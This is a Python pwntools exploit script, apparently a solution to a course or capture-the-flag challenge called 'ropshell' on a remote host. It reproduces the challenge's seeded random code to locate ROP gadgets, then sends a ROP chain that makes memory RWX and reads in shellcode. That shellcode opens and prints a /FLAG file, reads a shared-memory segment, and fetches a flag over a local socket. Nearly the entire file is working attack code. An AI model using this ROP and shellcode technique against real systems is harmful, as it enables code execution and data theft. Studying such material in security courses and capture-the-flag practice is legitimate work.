#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
# import asm
from pwn import asm
from pwnlib.util.packing import flat
import sys

context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

remote_bool = False
code_bytes = b''
start_code_address = None
timestamp = None

# address
pop_rax_ret = None
pop_rdi_ret = None
syscall_ret = None
pop_rsi_ret = None
pop_rdx_ret = None


def get_init_info():
    global start_code_address, timestamp

    if remote_bool:
        r.recvline()
        r.recvline()

    timestamp = int(r.recvline().decode().split(" ")[3])
    start_code_address = int(r.recvline().decode().split(" ")[5], base=16)

    print("timestamp: ", timestamp)
    print("start_code_address in hex: ", hex(start_code_address))
    return


def gen_random_code_bytes():
    """ c code here use to generate the code section content
    srand(t);
    for(i = 0; i < LEN_CODE/4; i++) {
        codeint[i] = (rand()<<16) | (rand() & 0xffff);
    }
    codeint[rand() % (LEN_CODE/4 - 1)] = 0xc3050f;   // 把 syscall ret 埋進去的
    if(mprotect(code, LEN_CODE, PROT_READ|PROT_EXEC) < 0) errquit("mprotect");
    """
    global timestamp, code_bytes

    import ctypes
    libc = ctypes.CDLL('libc.so.6')
    libc.srand(timestamp)
    LEN_CODE = (10*0x10000)

    codeint = []
    for i in range(0, int(LEN_CODE/4), 1):
        tmp = (libc.rand()<<16) | (libc.rand() & 0xffff)
        tmp &= 0xffffffff  # limit to the lower 32 bits
        codeint.append(tmp)
    codeint[libc.rand() % (int(LEN_CODE/4) - 1)] = 0xc3050f

    code_bytes = b''
    for single_int in codeint:
        byte_array = single_int.to_bytes(4, byteorder='little')
        code_bytes += byte_array

    return


def code_bytes_find(target_asm):
    global code_bytes

    pos = code_bytes.find(target_asm)
    if pos == -1:
        print("not found alert: ", target_asm)
    else:
        # print("pos: ", hex(pos))
        pass
    return pos


def get_rop_addr():
    global pop_rax_ret, pop_rdi_ret, syscall_ret, pop_rsi_ret, pop_rdx_ret

    pop_rax_ret = code_bytes_find(asm("pop rax\nret")) + start_code_address
    pop_rdi_ret = code_bytes_find(asm("pop rdi\nret")) + start_code_address
    syscall_ret = code_bytes_find(asm("syscall\nret")) + start_code_address
    pop_rsi_ret = code_bytes_find(asm("pop rsi\nret")) + start_code_address
    pop_rdx_ret = code_bytes_find(asm("pop rdx\nret")) + start_code_address


def mprotect_read_byte():
    global start_code_address, pop_rax_ret, pop_rdi_ret, syscall_ret, pop_rsi_ret, pop_rdx_ret

    mprotect_address = start_code_address & ~(0xfff)  # use the align address
    print("start_code_address: ", hex(start_code_address))
    print("mprotect_address: ", hex(mprotect_address))

    # 1. open memory = codeint to be able to read & write & execute
    # 2. read user input
    # ropshell will clean the register before executing
    send_line = flat(
        # mprotect, syscall number 10
        # rax: syscall number - 10
        # rdi: page start - mprotect_address 
        # rsi: page len - 40960
        # rdx: open mode -> read(0x1), write(0x2), exec(0x4) -(all or)-> 0x7
        pop_rax_ret,
        10,
        pop_rdi_ret,
        mprotect_address,
        pop_rsi_ret,
        10*0x10000,
        pop_rdx_ret,
        7,
        syscall_ret,

        # [mprotect_read_byte()'s 1st write]
        # write, syscall number 1
        # rax: syscall number - 1
        # rdi: fd (stdout) - 1
        # rsi: buf addr - start_code_address, write start from codeint
        # rdx: write len

        pop_rax_ret,
        1,
        pop_rdi_ret,
        1,
        pop_rsi_ret,
        start_code_address,
        pop_rdx_ret,
        50,
        syscall_ret,

        # read, syscall number 0
        # rax: syscall number - 0
        # rdi: fd (stdin) - 0
        # rsi: buf addr - start_code_address, read into codeint start
        # rdx: read len - 4096
        pop_rax_ret,
        0,
        pop_rdi_ret,
        0,
        pop_rsi_ret,
        start_code_address,
        pop_rdx_ret,
        4096,
        syscall_ret,

        # [mprotect_read_byte()'s 2nd write]
        # write, syscall number 1
        # rax: syscall number - 1
        # rdi: fd (stdout) - 1
        # rsi: buf addr - start_code_address, write start from codeint
        # rdx: write len

        pop_rax_ret,
        1,
        pop_rdi_ret,
        1,
        pop_rsi_ret,
        start_code_address,
        pop_rdx_ret,
        50,
        syscall_ret,

        # go to execute the code here after ret from write / read
        start_code_address,
    )

    return send_line


def task_2_asm_byte():
    # put data start from codeint start + 5*0x10000, second half of codeint
    global start_code_address
    FLAG_string_address = start_code_address + 5*0x10000
    read_content_address = start_code_address + 5*0x10000 + 0x100  # 16 bytes is enough for "0x2f464c414700"
    print("FLAG_string_address in hex str: ", str(hex(FLAG_string_address)))
    print("read_content_address in hex str: ", str(hex(read_content_address)))

    send_line = flat(
        # put /FLAG into codeint second half addr 
        # 1. rdi - codeint second half addr
        # 2. rax - /FLAG hex value with null terminator 00 (6 byte < 64 bits(x86_64 reg size))
        #    0x2f464c414700
        # 3. mov rax's value into rdi with 8 byte
        #    -> *** qword ptr not qword ***
        asm("mov rdi, " + str(hex(FLAG_string_address)) + "\n"),
        asm("""mov rax, 0x0047414c462f
        mov qword ptr [rdi], rax
        """),

        # open /FLAG file with O_RDONLY flag
        # rax: open syscall number 2
        # rdi: filename pointer - already set
        # rsi: read-only flag
        # rdx: no need to set
        asm("""mov rax, 2
        mov rsi, 0
        syscall
        """),

        # save file descriptor return from open (in rax) to r9
        asm("""mov r9, rax"""),

        # read from the file descriptor
        # rax: read syscall number 0
        # rdi: fd, r9
        # rsi: read content store into where
        # rdx: count, read 67 byte (flag len)
        asm("""mov rax, 0
        mov rdi, r9"""),
        asm("mov rsi, " + str(hex(read_content_address)) + "\n"),
        asm("""mov rdx, 67
        syscall
        """),

        # write the read content(flag) to stdout
        # rax: write syscall number 1
        # rdi: fd, stdout 1
        # rsi: write the content from what address
        # rdx: count, write 67 byte to stdout and end at null terminator (flag len)
        asm("""mov rax, 1
        mov rdi, 1"""),
        asm("mov rsi, " + str(hex(read_content_address)) + "\n"),
        asm("""mov rdx, 67
        syscall
        """),

        # close file descriptor
        # rax: open syscall number 3
        # rdi: fd, r9
        asm("""mov rax, 3
        mov rdi, r9
        syscall""")
    )

    # disassembly = disasm(send_line) # Disassemble shellcode
    # print("disassembly:\n", disassembly)

    return send_line


def task_3_asm_byte():
    # 1. sys_shmget
    #    -> create or access a share memory
    # 2. shmat
    #    -> map the share memory to the virtual memory of this process,
    #       so this process can directly access the data in the memory just like the data is belong to this process

    # 1. sys_shmget
    # rax: sys_shmget syscall number 29
    # rdi: key, 0x1337 -> 0x3713 (byte ordering)
    # rsi: size of the share memory you want to get, 100
    # rdx: shmflg, if flag not use than will get the exist segment associated with key
    #       -> "flag not use" == set to 0 (?)
    # return shmid, check is not -1
    # "v: %d\n" -> 0x763a2025640a -> 0x0a6425203a76

    # 2. shmat
    # rax: shmat syscall number 30
    # rdi: shmid, the return value of sys_shmget, in rax
    # rsi: shmaddr, can give the virtual memory address we want it map to, ex: a section of codeint,
    #      if 0 then system will allocate virtual memory for us
    #      shmat will return the address it map to in rax
    # rdx: shmflg, SHM_RDONLY -> 010000(*oct*) -> 0x1000(hex) -> 4096(dec), see https://codebrowser.dev/glibc/glibc/sysdeps/unix/sysv/linux/bits/shm.h.html
    # shmat() returns the address of the attached shared memory segment

    # 3. write the content in the virtual memory address out to the stdout 
    # rax: write syscall number 1
    # rdi: fd, stdout 1
    # rsi: write the content from the virtual memory address map to share memory(attach memory segment return from shmat)
    # rdx: count, write 100 byte to stdout and end at null terminator
    
    send_line = asm("""mov rax, 29
        mov rdi, 0x1337
        mov rsi, 200
        mov rdx, 0
        syscall
        mov rdi, rax
        mov rax, 30
        mov rsi, 0
        mov rdx, 0x1000
        syscall
        mov r14, rax
        mov rax, 1
        mov rdi, 1
        mov rsi, r14
        mov rdx, 69
        syscall""")

    # 4. if want to print a reg to debug
    # (1) put format string into a place on codeint
    # (2) mov rsi, codeint addr
    # (3) xor rax, rax
    # (4) call printf -> not sure if we can call printf
    #       [1] rdi - format string address -> place format string onto a place on codeint
    #       [2] rsi - the value want to insert into format string

    # disassembly = disasm(send_line) # Disassemble shellcode
    # print("disassembly:\n", disassembly)

    return send_line


def task_4_asm_byte():
    global start_code_address
    sockaddr_memory_address = start_code_address + 5*0x10000 + 0x1000
    flag3_memory_address = start_code_address + 5*0x10000 + 0x8000

    # socket -> connect -> read from server to get flag
    # 1. sys_socket
    #    man page: https://man7.org/linux/man-pages/man2/socket.2.html
    #              https://man7.org/linux/man-pages/man7/ip.7.html (IPv4 protocol)
    #    const(family, type) define: define: https://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html
    # rax: shmat syscall number 41
    # rdi: int family - AF_INET (ipv4) is 2(dec)
    # rsi: int type - SOCK_STREAM is 1 (dec) (seen in discussion)
    # rdx: int protocol - seems like only raw socket(define by type = SOCK_RAW) need to set this, otherwise fill in 0
    #      -> refer to 2nd man page ref
    #
    # return socket fd to rax if successfully create one, otherwise return -1 -> 3 success

    # 2. sys_connect
    # rax: shmat syscall number 42
    # rdi: int socket fd from the return value of sys_socket
    # rsi: struct sockaddr *uservaddr
    #       refer to struct sockaddr: https://man7.org/linux/man-pages/man7/ip.7.html (Address format part)
    #       struct sockaddr_in {
    #           sa_family_t    sin_family; /* address family: AF_INET */        -> 0x0002   (dec) -> 0x0200      2 bytes (little byte ordering)
    #           in_port_t      sin_port;   /* port in network byte order */     -> 0x1337   (hex) -> 0x3713      2 bytes (little byte ordering)
    #           struct in_addr sin_addr;   /* internet address */               -> 127.0.0.1 -> 0x 01 00 00 7F   4 bytes (little byte ordering)
    #       };       
    #                                                                           -> not enough bytes(14 - 8 = 6) fill in 0 (not sure), refer: https://www.qiniu.com/qfans/qnso-64271249
    #       ipv4 (32 bit) -> 8 bit(2^8 = 256)(2 hex) each nnn of nnn.nnn.nnn.nnn
    #       127.0.0.1 -> 0x7F(127) 0x00(0) 0x00(0) 0x01(1) - little byte ordering -> 0x 01 00 00 7F
    # rdx: int addrlen -> 16 bytes(2 bytes sa_family + 14 bytes sa_data) for ipv4 -> 0x10 (hex)
    #
    # return 0 to rax if connect success, else return -1 in error case -> seems like will be error if sockaddr wrong -> [debug]
    # 0200 3713 0100007F
    # 2000 1337 7F000001

    # 3. read from socket fd and store the flag to an codeint address
    # rax: read syscall number 0
    # rdi: socket fd -> already set in 2. but don't know if will be changed after 2. -> [debug]
    # rsi: read content from socket fd and store into flag3_memory_address
    # rdx: count, read 100 byte (flag len)

    # 4. write the content in codeint address to stdout
    # rax: write syscall number 1
    # rdi: fd, stdout 1
    # rsi: write the content from flag3_memory_address -> already set in 3. but don't know if will be changed after 3. -> [debug]
    # rdx: count, write 100 byte to stdout and end at null terminator (flag len)

    # 5. debug by print the reg
    #    mov the content in the reg to an codeint address
    #    write the content in the codeint address to stdout

    # 1. sys_socket return 3
    #    -> store rax(socket fd) into r11 -> qword ptr [r10]
    # 2. sys_connect return 3 
    #    -> store rax into r12
    # ** rbx, rbp, r12-r15 is callee reservation reg
    
    send_line =  asm("""mov rax, 41
        mov rdi, 2
        mov rsi, 1
        mov rdx, 0
        syscall
        mov rdi, rax
        mov rax, 42
        """) + asm("mov r14, " + str(hex(sockaddr_memory_address))) + asm("""
        mov word ptr [r14], 0x0002
        mov word ptr [r14 + 0x2], 0x3713
        mov dword ptr [r14 + 0x4], 0x0100007F
        mov qword ptr [r14 + 0x8], 0x0000000000000000
        mov rsi, r14
        mov rdx, 16
        syscall
        mov rax, 0
        """) + asm("mov rsi, " + str(hex(flag3_memory_address))) + asm("""
        mov rdx, 67
        syscall
        mov rax, 1
        mov rdi, 1
        """) + asm("mov rsi, " + str(hex(flag3_memory_address))) + asm("""
        mov rdx, 67
        syscall
        """)

    # disassembly = disasm(send_line) # Disassemble shellcode
    # print("disassembly:\n", disassembly)

    return send_line


def exit_0_asm_byte():
    # exit 0
    return asm("""mov rax, 60
        mov rdi, 0
        syscall""")


if __name__ == '__main__':
    r = None
    if 'qemu' in sys.argv[1:]:
        r = process("qemu-x86_64-static ./ropshell", shell=True)
    elif 'bin' in sys.argv[1:]:
        # r = process("./ropshell", shell=False)
        r = process("./server", shell=False)  # my server
    elif 'local' in sys.argv[1:]:
        r = remote("localhost", 10494)
    else:
        r = remote("up23.zoolab.org", 10494)
        remote_bool = True

    if type(r) != pwnlib.tubes.process.process:
        pw.solve_pow(r)

    # gdb.attach(r)

    # find target asm
    get_init_info()
    if start_code_address == None or timestamp == None:
        exit(0)

    gen_random_code_bytes()
    get_rop_addr()

    # [first send] -> mprotect & read from user input
    send_line = mprotect_read_byte()
    r.send(send_line)
    print("bytes command received output:\n", r.recvuntil("bytes command received.\n", drop=False).decode())

    # 1st write codeint output in mprotect_read_byte() -> if [mprotect_read_byte()'s 1st write] comment out, than this needs to turn off
    print(" ==================== 1st write output in mprotect_read_byte() ==================== ")
    print(r.recv())

    # [second send] -> input the asm we want to execute and it will be store into the start of codeint
    send_line_2 = task_2_asm_byte() + task_3_asm_byte() + task_4_asm_byte() + exit_0_asm_byte()
    print("send_line_2 to read:\n", send_line_2)
    r.send(send_line_2)

    # 2nd write codeint output in mprotect_read_byte() -> if [mprotect_read_byte()'s 2nd write] comment out, than this needs to turn off
    print("\n ==================== 2nd write output in mprotect_read_byte() ==================== ")
    print(r.recv())

    # 2nd write codeint output
    print("")
    r.interactive()